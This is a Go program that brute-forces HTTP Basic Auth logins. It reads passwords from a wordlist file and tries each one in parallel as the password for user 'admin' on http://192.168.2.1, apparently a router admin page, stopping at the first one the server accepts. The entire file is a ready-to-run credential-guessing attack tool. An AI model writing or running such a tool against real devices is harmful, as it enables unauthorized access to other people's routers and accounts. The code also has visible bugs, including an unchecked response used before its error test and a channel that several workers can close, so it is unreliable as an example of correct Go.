package main

import (
	"bufio"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
)

var (
	wguid int = 0
)

// the request worker
type Worker struct {
	wid     int
	client  *http.Client
	request *http.Request
	tpwd    chan string
	pwd     chan string
}

func newRequest(address string) (*http.Request, error) {
	req, err := http.NewRequest("GET", address, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "text/html,application/xhtml+xml,"+
		"application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; widows x86_64) "+
		"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36")
	return req, nil
}

func NewWorker(host string, tpwd, pwd chan string) (*Worker, error) {
	transport := &http.Transport{}
	client := &http.Client{
		Transport: transport,
	}
	req, err := newRequest(host)
	if err != nil {
		return nil, err
	}
	w := &Worker{
		wid:     wguid,
		client:  client,
		request: req,
		tpwd:    tpwd,
		pwd:     pwd,
	}
	wguid += 1
	return w, nil
}

func (w *Worker) Wid() int {
	return w.wid
}

//try http
func (w *Worker) Try() {
	for line := range w.tpwd {
		line = strings.TrimSpace(line)
		w.request.SetBasicAuth("admin", line)
		resp, err := w.client.Do(w.request)
		defer resp.Body.Close()
		if err != nil {
			log.Printf("Worker%d try password:%s err:%s\n", w.Wid(), line, err.Error())
			return
		}
		if resp.StatusCode < 400 {
			w.pwd <- line
			return
		}
		log.Printf("Worker%d try password:%s code:%d\n", w.Wid(), line, resp.StatusCode)
	}
	close(w.pwd)
}

func scanFile(f *os.File, tpwd chan string) {
	defer f.Close()
	scanner := bufio.NewScanner(f)
	var line string
	for scanner.Scan() {
		line = scanner.Text()
		tpwd <- line
		// log.Printf("Scan text:%s\n", line)
	}
	if err := scanner.Err(); err != nil {
		log.Printf("Scan error:%s\n", err.Error())
	}
	close(tpwd)
}

func main() {
	maxcpus := runtime.NumCPU()
	tpwd := make(chan string, maxcpus-1)
	pwd := make(chan string, 1)
	filename := "password.txt"
	f, err := os.Open(filename)
	if err != nil {
		log.Fatalln(err)
	}
	runtime.GOMAXPROCS(maxcpus)
	go scanFile(f, tpwd)

	for i := 0; i < maxcpus-1; i++ {
		w, err := NewWorker("http://192.168.2.1", tpwd, pwd)
		log.Printf("Start worker%d\n", w.Wid())
		if err != nil {
			log.Printf("Error:%s\n", err.Error())
			continue
		}
		go w.Try()
	}

	getpwd, ok := <-pwd
	if ok {
		log.Printf("Get password:%s\n", getpwd)
	} else {
		log.Println("Get nothing")
	}
}
